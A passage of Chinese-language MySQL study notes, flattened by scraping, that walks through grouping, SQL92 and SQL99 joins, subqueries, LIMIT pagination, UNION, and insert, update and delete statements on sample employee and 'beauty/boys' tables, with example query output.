employees;#和以上方法意思相同mysql&gt; select count(1) from employees;效率:5.5版本之前用myisam存储引擎下，count(*)的效率高5.5版本之后用innodb存储引擎下，count(*)和count(1)效率差不多，但比count(字段)要高，如果里面加字段，他会进行一个判断，判断是否为null如果为null不加16、和分组函数一同查询的字段有限制#虽然语法没报错但是它的employee_id是错误的mysql&gt; select avg(salary),employee_id from employees;+-------------+-------------+| avg(salary) | employee_id |+-------------+-------------+| 6461.682243 | 100 |+-------------+-------------+ 分组查询12345678特点： 1、分组查询中的筛选条件分为两类 分组前筛选 原始表 它的位置是在group by 子句的前面 关键字是where 分组后筛选 分组后的结果集 它的位置是在group by 子句的后面 关键字是having ①分组函数做条件一定是放在having子句中 ②能用分组前筛选的，就优先考虑使用分组前筛选 2、group by子句支持单个字段分组、多个字段分组(多个字段之间用&quot;,&quot;逗号隔开没有顺寻要求)，表达式或函数(用得较少) 3、也可以添加排序(排序放在整个分段查询的最后) 123456789语法:​ select 分组函数,字段(要求出现在group by的后面)​ from 表名​ 【where 筛选条件】​ group by 分组的列表​ 【order by 子句】注意: 370 查询列表必须特殊，要求是分组函数和group by后出现的字段 123456789101112131415161718192021222324简单的分组查询案例一:查询每个工种的最高工资mysql&gt; select max(salary),job_id -&gt; from employees -&gt; group by job_id; 案例二:查询每个位置上的部门个数mysql&gt; select count(*),location_id -&gt; from departments -&gt; group by location_id; 添加分组前的筛选条件案例一: 查询邮箱中包含a字符的，每个部门的平均工资mysql&gt; select avg(salary),department_id -&gt; from employees -&gt; where email like &#39;%a%&#39; -&gt; group by department_id;案例二:查询有奖金的每个领导手下员工的最高工资mysql&gt; select max(salary),manager_id -&gt; from employees -&gt; where commission_pct is not null -&gt; group by manager_id; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647添加分组后的的筛选条件案例一:查询哪个部门的员工表个数&gt;2mysql&gt; select count(*),department_id -&gt; from employees -&gt; group by department_id -&gt; having count(*)&gt;2;+----------+---------------+| count(*) | department_id |+----------+---------------+| 6 | 30 || 45 | 50 || 5 | 60 || 34 | 80 || 3 | 90 || 6 | 100 |+----------+---------------+ 案例二:查询每个工种有奖金的员工的最高工资&gt;12000的工种编号和最高工资mysql&gt; select max(salary),job_id -&gt; from employees -&gt; where commission_pct is not null -&gt; group by job_id -&gt; having max(salary)&gt;12000;+-------------+--------+| max(salary) | job_id |+-------------+--------+| 14000.00 | SA_MAN |+-------------+--------+案例三:查询领导编号&gt;102的每个领导手下的最低工资&gt;5000的领导编号是那个，以及其最低工资mysql&gt; select min(salary),manager_id -&gt; from employees -&gt; where manager_id&gt;102 -&gt; group by manager_id -&gt; having min(salary)&gt;5000;+-------------+------------+| min(salary) | manager_id |+-------------+------------+| 6900.00 | 108 || 7000.00 | 145 || 7000.00 | 146 || 6200.00 | 147 || 6100.00 | 148 || 6200.00 | 149 || 6000.00 | 201 || 8300.00 | 205 |+-------------+------------+ 123456789101112131415161718192021222324252627282930313233343536373839404142按表达式或函数分组案例:员工姓名的长度分组，查询每一组的员工个数，筛选员工个数大于5的有哪些mysql&gt; select count(*),length(last_name) -&gt; from employees -&gt; group by length(last_name) -&gt; having count(*)&gt;5; +----------+-------------------+| count(*) | length(last_name) |+----------+-------------------+| 11 | 4 || 29 | 5 || 28 | 6 || 15 | 7 || 7 | 8 || 8 | 9 |+----------+-------------------+按多个字段分组案例:查询每个部门每个工种的员工的平均工资mysql&gt; select avg(salary),department_id,job_id -&gt; from employees -&gt; group by department_id,job_id;+--------------+---------------+------------+| avg(salary) | department_id | job_id |+--------------+---------------+------------+| 7000.000000 | NULL | SA_REP || 4400.000000 | 10 | AD_ASST || 13000.000000 | 20 | MK_MAN | 添加排序案例:查询每个部门每个工种的员工的平均工资，并且按平均工资的高低显示mysql&gt; select avg(salary),department_id,job_id -&gt; from employees -&gt; group by department_id,job_id -&gt; order by avg(salary) desc;+--------------+---------------+------------+| avg(salary) | department_id | job_id |+--------------+---------------+------------+| 24000.000000 | 90 | AD_PRES || 17000.000000 | 90 | AD_VP || 13000.000000 | 20 | MK_MAN || 100.000000 | 80 | SA_MAN | 连接查询多表连接含义:又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询123456789101112131415161718192021222324252627282930313233343536373839404142434445笛卡尔乘积现象:表一 有m行，表2有n行，结果是&#x3D;m*n行发生原因:没有有效的连接条件如何避免:添加有效的连接条件分类: 按年代分类: sql92标准:仅仅支持内连接 sql99标准(推荐):支持内连接+外连接(左外和右外)+交叉连接 sql92: 内连接 sql99: 内连接 外连接 交叉连接 按功能分类: 内连接: 等值连接 非等值连接 自连接 外连接: 左外连接 右外连接 全外连接(MySQL不支持) 交叉连接错误语法:select name,boyName from beauty,boys;笛卡尔集的错误情况:select count(*) from beauty;假设输出12行select count(*) from boys;假设输出4行最终结果:12*4&#x3D;48行正确语法select 表,表 from 库 where 表.字段&#x3D;表.字段;mysql&gt; select name,boyName from boys,beauty -&gt; where 等值连接; -&gt; 【and 筛选条件】 -&gt; 【group by 分组】 -&gt; 【having 分组后筛选】 -&gt; 【order by 排序字段】 一：sql92标准等值连接1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001、等值连接①多表等值连接的结果多为表的交集部分②n表连接，最少需要n-1个连接条件③多表二的顺序没有要求④一般需要为表起别名⑤可以搭配前面的所有子句使用，比如排序、分组、筛选案例一:查询女神们和对应的男神名mysql&gt; select name,boyName -&gt; from boys,beauty -&gt; where beauty.boyfriend_id&#x3D;boys.id; 案例二:查询员工名和对应的部门名mysql&gt; select last_name,department_name -&gt; from employees,departments -&gt; where employees.department_id&#x3D;departments.department_id; 2、为表起别名好处:提高语句的简洁度，区分多个重名字段注意:如果为表起了别名，则查询的阻断就不能使用原来的表名去限定查询工种号、工种名、员工名mysql&gt; select last_name,e.job_id,job_title -&gt; from employees e,jobs j -&gt; where e.job_id&#x3D;j.job_id; 3、两个表的顺序是否可以调换查询工种号、工种名、员工名#可以mysql&gt; select last_name,e.job_id,job_title -&gt; from e,jobs j，employees e -&gt; where e.job_id&#x3D;j.job_id; 4、可以加筛选案例1:查询有奖金的员工名、部门名mysql&gt; select last_name,department_name,commission_pct -&gt; from employees e,departments d -&gt; where e.department_id&#x3D;d.department_id and e.commission_pct is not null; 案例2:查询城市名中第二个字符为o的部门名和城市名mysql&gt; select department_name,city -&gt; from departments d,locations l -&gt; where d.location_id&#x3D;l.location_id and city like &#39;_o%&#39;;+-----------------+---------------------+| department_name | city |+-----------------+---------------------+| IT | Southlake || Shi | South San Francisco || Mar | Toronto || Hum | London |+-----------------+---------------------+5、可以加分组案例1:查询每个城市的部门个数mysql&gt; select count(*),city -&gt; from departments d,locations l -&gt; where d.location_id&#x3D;l.location_id -&gt; group by city;+----------+---------------------+| count(*) | city |+----------+---------------------+| 1 | London || 1 | Munich || 1 | Oxford || 21 | Seattle || 1 | South San Francisco || 1 | Southlake || 1 | Toronto |+----------+---------------------+案例2:查询有奖金的每个部门的部门名和部门的领导编号和该部门的最低工资mysql&gt; select min(salary),department_name,d.manager_id -&gt; from employees e,departments d -&gt; where e.department_id&#x3D;d.department_id and commission_pct is not null -&gt; group by department_name,d.manager_id;+-------------+-----------------+------------+| min(salary) | department_name | manager_id |+-------------+-----------------+------------+| 6100.00 | Sal | 145 |+-------------+-----------------+------------+6、可以加排序mysql&gt; select job_title,count(*) -&gt; from jobs j,employees e -&gt; where j.job_id&#x3D;e.job_id -&gt; group by job_title -&gt; order by count(*) desc;+---------------------------------+----------+| job_title | count(*) |+---------------------------------+----------+| Sales Representative | 30 || Shipping Clerk | 20 || Stock Clerk | 20 || Purchasing Clerk | 5 |7、可以实现三表连接案例:查询员工名、部门名和所在城市mysql&gt; select last_name,department_name,city -&gt; from employees e,departments d,locations l -&gt; where d.department_id&#x3D;e.department_id and d.location_id&#x3D;l.location_id; 非等值连接12345678910111213141516171819语法: mysql&gt; select name,boyName from boys,beauty -&gt; where 非等值连接; -&gt; 【and 筛选条件】 -&gt; 【group by 分组】 -&gt; 【having 分组后筛选】 -&gt; 【order by 排序字段】案例1:查询员工的工资和工资级别，并进行排序mysql&gt; select salary,grade_level -&gt; from employees e,job_grades g -&gt; where salary between g.lowest_sal and g.highest_sal -&gt; order by grade_level desc;+----------+-------------+| salary | grade_level |+----------+-------------+| 24000.00 | E || 17000.00 | E || 17000.00 | E | 自连接12345678910111213141516171819202122语法: mysql&gt; select name,boyName from boys,beauty -&gt; from 表 别名1,表 别名2 -&gt; where 等值; -&gt; 【and 筛选条件】 -&gt; 【group by 分组】 -&gt; 【having 分组后筛选】 -&gt; 【order by 排序字段】案例:查询员工名和上级名称mysql&gt; select e.employee_id,e.last_name,m.employee_id,m.last_name -&gt; from employees e,employees m -&gt; where e.employee_id&#x3D;m.manager_id;+-------------+-----------+-------------+-------------+| employee_id | last_name | employee_id | last_name |+-------------+-----------+-------------+-------------+| 100 | K_ing | 101 | Kochhar || 100 | K_ing | 102 | De Haan || 102 | De Haan | 103 | Hunold || 103 | Hunold | 104 | Ernst || 103 | Hunold | 105 | Austin || 103 | Hunold | 106 | Pataballa | 二、sql99语法1234567891011121314151617181920212223语法: select 查询列表 from 表1 别名 【join】 表2 别名 on 连接条件 【where 筛选条件】 【group by 分组】 【having 筛选条件】 【order by 排序】 分类:#以下英文标识连接条件，方括号中可加可不加内连接:inner外连接 左外:left 【outer】 右外:right 【outer】 全外:full 【outer】交叉连接:cross内连接: A表和B表能够完全匹配的记录查询出来，被称为内连接外连接: A表和B表能够完全匹配的记录查询出来之外，将其中一张表的记录无条件的查询出来对方表没有匹配的记录会自动显示null与之匹配，这种查询被称为外连接。 外连接的查询结果条数 &gt;&#x3D; 内连接的查询结果条数 一、内连接12345678910111213141516171819select 查询列表from 表1 别名inner join 表2 别名on 连接条件;內连分类: 等值连接 非等值连接 自连接 特点1: ①添加排序、分组、筛选 ②inner可以省略 ③筛选条件放在where后面，连接条件放在on的后面，提高了分离性，便于阅读 ④inner join连接和sql92语法中的等值连接效果是一样的，都是查询多表的交集特点2: ①表的顺序调换 ②内连接的结果&#x3D;多表的交集 ③n表连接至少需要n-1个连接条件 1、等值连接123456789101112131415161718192021222324252627案例一:查询员工名、部门名mysql&gt; select last_name,department_name -&gt; from employees e -&gt; inner join departments d -&gt; on e.department_id&#x3D;d.department_id; 案例二:查询名字中包含e的员工名和工种名（筛选）mysql&gt; select last_name,job_title -&gt; from employees e -&gt; inner join jobs j -&gt; on e.job_id&#x3D;j.job_id -&gt; where e.last_name like &#39;%e%&#39;; 案例三:查询部门个数&gt;3的城市名和部门个数（分组+筛选）mysql&gt; select city,count(*) -&gt; from departments d -&gt; inner join locations l -&gt; on d.location_id&#x3D;l.location_id -&gt; group by city -&gt; having count(*)&gt;3; 案例四:查询部门的员工个数&gt;3的城市名和部门个数，并按个数降序（分组+筛选+排序）mysql&gt; select count(*),department_id -&gt; from employees e -&gt; group by department_id -&gt; having count(*)&gt;3 -&gt; order by count(*) desc; 12345678910111213141516三表连接语法格式:select 查询条件from 表1 别名【inner】join 表2 别名 on 表1&#x3D;表3 #等值连接【inner】join 表3 别名 on 表1&#x3D;表3 #等值连接案例五:查询员工名、部门名、工种名，并按部门名降序()#进行多面连接时候，先from后面的表和第一个join的表连接然后再将from后面的表和第二个join表连接mysql&gt; select last_name,department_name,job_title -&gt; from employees e -&gt; inner join departments d on e.department_id&#x3D;d.department_id -&gt; inner join jobs j on e.job_id&#x3D;j.job_id -&gt; order by department_name desc; 2、非等值连接1234567891011121314查询员工的工资级别mysql&gt; select salary,grade_level -&gt; from employees e -&gt; inner join job_grades g -&gt; on e.salary between g.lowest_sal and g.highest_sal; 查询每个工资级别的个数&gt;20的个数，并且按工资级别排序mysql&gt; select count(*),grade_level -&gt; from employees e -&gt; join job_grades g -&gt; on e.salary between g.lowest_sal and g.highest_sal -&gt; group by grade_level -&gt; having count(*)&gt;20 -&gt; order by count(*) desc; 3、自连接1234mysql&gt; select e.last_name,m.last_name -&gt; from employees e -&gt; inner join employees m -&gt; on e.manager_id&#x3D;m.employee_id; 二、外连接123为什么inner和outer可以省略，加上去有什么好处? - 可以省略，因为区分内连接和外连接的依靠的不是这些关键字而是left&#x2F;right若存在，表示一定是一个外连接，其他都是内连接 - 加上去的好处是增强可读性 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748语法: select 查询列表 from 表1 别名 left|right|full【outer】 表2 别名 on 连接条件 #其中任意一个都可以 【where 筛选条件】 【group by 分组】 【having 筛选条件】 【order by 排序】特点:1、外链接的查询结果为主要表中的所有行 如果从表中有和它匹配的，则显示匹配的行 如果从表中没有和它匹配的则显示null 外连接查询结果&#x3D;内连接结果+主表中有而从表中没有的记录2、左外连接，left join左边的是主表 右外连接, right join右边的是主表3、左外和右外交换两个表的顺序，可以实现同样的效果4、一般用于查询除了交集部分的剩余的不匹配的行引入:查询男朋友不在男神表的女神名左外连接mysql&gt; select b.name,bo.* -&gt; from beauty b -&gt; left outer join boys bo -&gt; on b.boyfriend_id &#x3D; bo.id -&gt; where bo.id is null 右外连接mysql&gt; select b.name,bo.* -&gt; from boys bo -&gt; right outer joinbeauty b -&gt; on b.boyfriend_id &#x3D; bo.id -&gt; where b.id is null 案例一:查询那个部门没有员工左外连接mysql&gt; select d.*,e.employee_id -&gt; from departments d -&gt; left outer join employees e -&gt; on d.department_id&#x3D;e.department_id -&gt; where e.employee_id is null; 右外连接mysql&gt; select d.*,e.employee_id -&gt; from employees e -&gt; right outer join departments d -&gt; on d.department_id&#x3D;e.department_id -&gt; where e.employee_id is null; 交叉连接123456语法: select 查询列表 from 表1 别名 cross join 表2 别名;特点:类似于笛卡尔乘积 123mysql&gt; select b.*,bo.* -&gt; from beauty b -&gt; cross join boys bo; 123sql92和sql99功能:sql99支持的较多可读性:sql99实现连接条件和筛选条件的分离，可读性较高 子查询123456789101112131415161718192021222324含义:出现在其他语句中的select语句，成为子查询或内查询外部如果shiselect语句，则此语句成为主查询或外查询分类:按子查询出现的位置可以放在 select后面: 仅仅支持标量子查询 #select后面只能放标量子查询 from后面: 支持表子查询 where或having后面: ★ #这三个重点 标量子查询 ★ 列子查询 ★ 行子查询 #用的较少 exists后面 标量子查询 列子查询 行子查询按结果集的行列数不同: 标量子查询(结果集只有一行一列) 列子查询(结果集只有一列多行) 行子查询(结果集有多行多列) 表子查询(结果集，一般为多行多列) 12345678示例:where或having1、标量子查询 select first_name from employees where department_id in( select department_id from departments where location_id&#x3D;1700 ) 一、where或having后面1231、标量子查询(单行子查询)2、列子查询(多行子查询)3、行子查询(多列多行) 12345678特点:①子查询放在小括号内②子查询一般放在条件的右侧③标量子查询，一般搭配着单行操作符使用 #单行操作符就是条件运算符&gt; &lt; &gt;&#x3D; &lt;&#x3D; &#x3D; &lt;&gt;列子查询，一般搭配着多行操作符使用in、any&#x2F;some、all④子查询的执行优先于主查询执行，主查询的条件用到了子查询的结果 1、标量子查询123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 子查询就是select语句嵌套select语句 子查询可以出现在: select..(select). #可以出现在select后面 from ..(select). #可以出现在from后面 where ..(select). #可以出现where后面 格式: select 字段 from 表名 where 筛选条件(查询条件)where后面使用子查询案例1:谁的工资比Abel高①：先找出谁的名字叫Abelselect salary from employees -&gt; where last_name&#x3D;&#39;Abel&#39;;②再将他们的工资比较 mysql&gt; select * from employees -&gt; where salary&gt;(select salary from employees -&gt; where last_name&#x3D;&#39;Abel&#39;); 案例2::返回job_id与141号员工相同，salary比143号员工多的员工 姓名，job_id和工资mysql&gt; select job_id,last_name,salary -&gt; from employees -&gt; where job_id &#x3D; (select job_id from employees -&gt; where employee_id &#x3D; 141) and -&gt; salary&gt;(select salary from employees -&gt; where employee_id&#x3D;143);+----------+-------------+---------+| job_id | last_name | salary |+----------+-------------+---------+| ST_CLERK | Nayer | 3200.00 || ST_CLERK | Mikkilineni | 2700.00 || ST_CLERK | Bissot | 3300.00 || ST_CLERK | Atkinson | 2800.00 || ST_CLERK | Mallin | 3300.00 || ST_CLERK | Rogers | 2900.00 || ST_CLERK | Ladwig | 3600.00 || ST_CLERK | Stiles | 3200.00 || ST_CLERK | Seo | 2700.00 || ST_CLERK | Rajs | 3500.00 || ST_CLERK | Davies | 3100.00 |+----------+-------------+---------+11 rows in set (0.00 sec)案例3:返回公司工资最少的员工的last_name,job_id和salarymysql&gt; select salary,last_name,job_id -&gt; from employees -&gt; where salary&#x3D;(select min(salary) from employees);having后面案例4:查询最低工资大于50号部门最低工资的部门id和其最低工资mysql&gt; select min(salary),department_id -&gt; from employees -&gt; group by department_id -&gt; having min(salary)&gt;(select min(salary) -&gt; from employees -&gt; where department_id&#x3D;50); 注意:非法使用标量子查询也就是说子查询的结果不是一行一列 2、列子查询（多行子查询） 多行子查询操作符 操作符 含义 in/not in 等于列表中的任意一个 any | some 和子查询返回的某一个值比较 all 和子查询返回的所有值比较 1234567891011121314151617181920212223242526272829303132333435363738394041424344案例1:返回location_id是1400或1700的部门中所有员工姓名mysql&gt; select last_name -&gt; from employees -&gt; where department_id in (select department_id from departments -&gt; where location_id in(1400,1700));+------------+| last_name |+------------+| K_ing || Kochhar || De Haan || Hunold |案例2:返回其他部门中比job_id为&#39;IT_PROG&#39;部门任一工资低的员工的员工号、姓名、job_id以及salary①查询job_id为&#39;IT_PROG&#39;部门mysql&gt; select salary -&gt; from employees -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;②查询员工号、姓名、job_id以及salary，salary&lt;(①)的任意一个mysql&gt; select last_name,employee_id,job_id,salary -&gt; from employees -&gt; where salary&lt;any(select salary from employees where job_id&#x3D;&#39;IT_PROG&#39;);或mysql&gt; select last_name,employee_id,job_id,salary -&gt; from employees#小于any也就是比子查询里的都小，也就是小于最大的，就可以改成max(salary)，外面就不需要any了 -&gt; where salary&lt;(select max(salary) from employees where job_id&#x3D;&#39;IT_PROG&#39;); 案例3:返回其他部门中比job_id为&#39;IT_PROG&#39;部门所有工资都低的员工的员工号、姓名、job_id以及salary①查询job_id为&#39;IT_PROG&#39;部门mysql&gt; select salary -&gt; from employees -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;②查询员工号、姓名、job_id以及salary，salary&lt;(①)的全部mysql&gt; select employee_id,last_name,job_id,salary -&gt; from employees -&gt; where salary&lt;all(select salary from employees -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;;或mysql&gt; select employee_id,last_name,job_id,salary -&gt; from employees -&gt; where salary&lt;(select max(salary) from employees -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;; 3、行子查询（结果集一行多列或多行多列）1234567行子查询（了解） #有局限性，不常用案例:查询员工编号最小并且工资最高的员工mysql&gt; select * -&gt; from employees -&gt; where (employee_id,salary)&#x3D;( -&gt; select min(employee_id),max(salary) -&gt; from employees); 二、select后面(了解)1234567891011121314151617181920select后面仅仅支持标量子查询案例1:查询每个部门的员工个数mysql&gt; select d.*,(select count(*) -&gt; from employees e -&gt; where e.department_id&#x3D;d.department_id) -&gt; from departments d;案例2:查询员工号&#x3D;102的部门名mysql&gt; select ( -&gt; select department_name -&gt; from departments d -&gt; inner join employees e -&gt; on d.department_id &#x3D; e.department_id -&gt; where e.employee_id &#x3D; 102) 部门名;+--------+| 部门名 |+--------+| Exe |+--------+ 三、from后面1234567891011121314将子查询结果充当一张表，要求必须起别名案例:查询每个部门的平均工资的工资等级①先查询部门的平均工资select avg(salary) ag,department_id -&gt; from employees -&gt; group by department_id②将查询工资等级并将平均工资表连接，进行工资等级判断mysql&gt; select ag_dep.*,g.grade_level -&gt; from ( -&gt; select avg(salary) ag,department_id -&gt; from employees -&gt; group by department_id) ag_dep #子查询必须加别名不然找不到 -&gt; inner join job_grades g -&gt; on ag_dep.ag between lowest_sal and highest_sal; 四、exists(相关子查询)123456789101112131415161718192021#exists(是否存在)语法: exists(完整的查询)结果: 1或者是0 #1也就相当于布尔类型的True，0代表Falseexists相当于布尔类型，只判断True和False因为子查询中有数值所以返回1mysql&gt; select exists(select employee_id from employees) result;+--------+| result |+--------+| 1 |+--------+在子查询中筛选了salary中等于3w的数值，但是salary中并没有3w所以返回0mysql&gt; select exists(select employee_id from employees where salary&#x3D;30000) result;+--------+| result |+--------+| 0 |+--------+ 1234567891011121314151617181920212223242526272829303132333435363738但凡能用exists的都可以用in来代替案例一:查询有员工名的部门名#existsmysql&gt; select department_name -&gt; from departments d -&gt; where exists(select * from employees e -&gt; where d.department_id &#x3D; e.department_id);+-----------------+| department_name |+-----------------+| Adm || Mar || Pur || Hum || Shi || IT || Pub || Sal || Exe || Fin || Acc |+-----------------+ #inmysql&gt; select department_name from departments d -&gt; where department_id in (select department_id from employees);案例2:查询没有女朋友的男神信息#inmysql&gt; select bo.* -&gt; from boys bo -&gt; where bo.id not in (select boyfriend_id -&gt; from beauty);#existsmysql&gt; select bo.* -&gt; from boys bo -&gt; where not exists (select * from beauty -&gt; where bo.id&#x3D;beauty.boyfriend_id); 12345678910子查询案例:查询各部门中工资比本部门平均工资高的员工的员工号，姓名和工资mysql&gt; select employee_id,last_name,salary,e.department_id -&gt; from employees e -&gt; inner join ( -&gt; select avg(salary) ag,department_id -&gt; from employees -&gt; group by department_id) ag_dep -&gt; on e.department_id &#x3D; ag_dep.department_id -&gt; where salary&gt;ag_dep.ag; 分页查询(重点)1234567891011121314151617应用场景:当要查询的条目太多，一页显示不全1、limit用来获取一张表中某部分数据2、limit只有在MySQL中存在不通用，是MySQL数据库管理系统的特色语法: select 查询列表 #7 from 表 #执行循序 1 【join type join 表2 #2 【on 连接条件】 #3 【where 筛选条件】 #4 【group by 分组字段】 #5 【having 分组后筛选】 #6 【order by 排序的字段】 #8 limit 【offset】,size; #9 offset可以省略，省略之后默认起始值是0 offset表示要显示条目的起始索引(起始索引从0开始，) 如果起始下标没有指定，默认从0开始，0标识表中第一条记录 size表示要显示的条目个数 123456789101112131415特点: ①limit语句放在查询语句的最后， ②公式 要显示的页数 page，每页的条目数是size通用的分页sql【只适合MySQL数据库管理系统】 select 查询列表 from 表 limit (page-1)*size,size;规律： size &#x3D; 10 page size 1 0 2 10 3 20 12345678910111213案例1:查询前五条员工信息mysql&gt; select * from employees limit 0,5;或mysql&gt; select * from employees limit 5;案例2:查询第11条到第25条mysql&gt; select * from employees limit 11,15;案例3:有奖金的员工信息，并且工资较高的前10名显示出来mysql&gt; select * from employees -&gt; where commission_pct is not null -&gt; order by salary desc -&gt; limit 10; 联合查询1234567891011121314151617union 联合 合并; 将多条查询语句的结果合并成一个结果&lt;&gt; 也就是相当于联合查询中包含多条查询语句，每个查询语句都是有一个小结果，用union一联合就会将多个结果合并成一个结果语法:查询语句1union查询语句2union...应用场景:要查询的结果来自于多个表，且多个表没有直接的连接关系，但查询的信息一致时注意事项: ★ 1、要求多条查询语句的查询列数是一致的 2、要求多条查询语句的查询的每一列的类型和顺序最好是一致的 3、使用union关键字默认去重，如果使用union all 可以包含重复项 12345678910引入案例:查询部门编号&gt;90或者邮箱中包含a的员工信息之前实现语法:mysql&gt; select * from employees where email like &#39;%a%&#39; or department_id&gt;90;union实现语法:# 将邮箱中包含a的员工信息查找出来，这是第一个结果mysql&gt; select * from employees where email like &#39;%a%&#39;# 使用union联合查询，将两条结果合并成一个结果 -&gt; union# 将部门编号&gt;90的信息查找出来，这是第二个结果， -&gt; select * from employees where department_id&gt;90; DML语言123456DML语言可以以称作:数据操作语言涉及到：数据的 插入:insert数据的 修改:update数据的 删除:delete 插入语句123insert语法中要包含 表名、字段名、值语法：insert into 表名(字段名,......) values(值1,....); 12345678910111213141516171819202122232425262728293031323334353637383940414243方式一:经典的插入注意:1、插入的值得类型要与列的类型一致或兼容mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id) -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2);+----+------------+------+---------------------+-------------+-------+-------+| 12 | 赵敏 | 女 | 1992-02-03 00:00:00 | 18209179577 | NULL | 1 || 13 | 唐艺昕 | 女 | 1990-04-23 00:00:00 | 1898888888 | NULL | 2 |+----+------------+------+---------------------+-------------+-------+-------+2、不可以为null的列必须插入值，可以为null的列，如何插入值 方式一:mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id)#可以为null的列不想写入值可以直接写null -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2); 方式二:#将 为null的列和值不写，其中可以为null的字段不写入值得时候，运行时显示他的默认值mysql&gt; insert into beauty(id,name,sex,borndate,phone,boyfriend_id) -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,2); 3、列的顺序可以调换，但需要一一对应mysql&gt; insert into beauty(name,sex,id,phone) -&gt; values(&#39;蒋欣&#39;,&#39;女&#39;,16,&#39;110&#39;);+----+------------+------+---------------------+-------------+-------+-------+| 16 | 蒋欣 | 女 | 1987-01-01 00:00:00 | 110 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+-------+4，列数和值的个数必须一致# boyfrined_id可以为空，但是values里面的值并没有写入null那这样就会报错mysql&gt; insert into beauty(name,sex,id,phone,boyfrined_id) -&gt; values(&#39;关晓彤&#39;,&#39;女&#39;,17,&#39;110&#39;);# 报错内容是:列与值不匹配ERROR 1136 (21S01): Column count doesn&#39;t match value count at row 15，可以省略列名，默认所有列，而且列的顺序和表中的列顺序一致mysql&gt; insert into beauty -&gt; values(14,&#39;张飞&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,null);+----+------------+------+---------------------+-------------+-------+-------+| 14 | 张飞 | 男 | NULL | 11111 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+-------+ 123456789101112方式二:语法:insert into 表名set 列名&#x3D;值,列名&#x3D;值....案例1:mysql&gt; insert into beauty -&gt; set id&#x3D;15,name&#x3D;&#39;刘涛&#39;,phone&#x3D;&#39;999&#39;;+----+------------+------+---------------------+-------------+-------+---+| 15 | 刘涛 | 女 | 1987-01-01 00:00:00 | 999 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+---+ 12345678910111213141516171819两种方式比较方式一支持插入多行,方式二不支持mysql&gt; insert into beauty -&gt; values(17,&#39;张飞1&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2) -&gt; ,(18,&#39;张飞2&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2) -&gt; ,(19,&#39;张飞3&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2);+----+------------+------+---------------------+-------------+-------+---+| 17 | 张飞1 | 男 | NULL | 11111 | NULL | 2 || 18 | 张飞2 | 男 | NULL | 11111 | NULL | 2 || 19 | 张飞3 | 男 | NULL | 11111 | NULL | 2 | +----+------------+------+---------------------+-------------+-------+---+方式一支持子查询，方式二不支持# 子查询在这里可以充当插入，也可以将select后的值改成变量，来写成完整的子查询mysql&gt; insert into beauty(id,name,phone) -&gt; select 20,&#39;宋茜&#39;,&#39;115112313&#39;; # 例如: select id,boyname,&#39;115112313&#39;;+----+------------+------+---------------------+-------------+-------+-------+| 20 | 宋茜 | 女 | 1987-01-01 00:00:00 | 115112313 | NULL | NULL |+----+------------+------+---------------------+-------------+-------+-------+ 二、修改语句1234567891011121314151617181、修改单表的记录★语法:update 表名set 列&#x3D;新值,列&#x3D;新值,...where 筛选条件;2、修改多表的记录【补充】sql92语法:update 表1 别名,表2 别名set 列&#x3D;值...where 连接条件 and 筛选条件;sql99语法update 表1 别名inner|left|right join 表2 别名on 连接条件set 列&#x3D;值...where 筛选条件 1234567891011121314151617181920212223242526271、修改单表的记录案例1: 修改beauty表中姓张的电话为13899888899mysql&gt; update beauty set phone &#x3D; &#39;13899888899&#39; where name like &#39;张%&#39;;案例2: 修改boys表中的id号为2的名称为张飞，魅力值为10mysql&gt; update boys set boyname&#x3D;&#39;张飞&#39;,usercp&#x3D;10 where id &#x3D; 2;+----+---------+--------+| id | boyName | userCP |+----+---------+--------+| 1 | 张无忌 | 100 || 2 | 张飞 | 10 || 3 | 黄晓明 | 50 || 4 | 段誉 | 300 |+----+---------+--------+2、修改多表记录【补充】案例1:修改张无忌的女朋友的手机号为114mysql&gt; update boys bo -&gt; inner join beauty b on bo.id &#x3D; b.boyfriend_id -&gt; set b.phone &#x3D; &#39;114&#39; -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;;案例2:修改没有男朋友的女神的男朋友编号都为2号mysql&gt; update boys bo -&gt; right join beauty b on bo.id&#x3D;b.boyfriend_id -&gt; set b.boyfriend_id&#x3D;2 -&gt; where bo.id is null; 三、删除语句12345678910111213141516171819202122删除语句删除的时候是直接删除一行而不是单个值方式一:delete语法:1、单表的删除【★】delete from 表名 where 筛选条件2、多表的删除【补充】sql92语法：delete 表1 别名,表2 别名from 表1 别名,表2 别名where 连接条件and 筛选条件sql99语法:delete 表1 别名,表2 别名from 表1 别名inner|left|right join 表2 别名 on 连接条件where 筛选条件方式二，truncate语法: truncate table 表名; 1234方式一：delete1、单表的删除案例1：删除手机号结尾为9的女神信息mysql&gt; delete from beauty where phone like &#39;%9&#39;; 1234567891011122、多表的删除【了解】案例:删除张无忌的女朋友的信息mysql&gt; delete b from beauty b -&gt; inner join boys bo on b.boyfriend_id &#x3D; bo.id -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;; 案例:删除黄晓明得信息以及他女朋友的信息mysql&gt; delete b,bo -&gt; from beauty b -&gt; inner join boys bo -&gt; on b.boyfriend_id&#x3D;bo.id -&gt; where 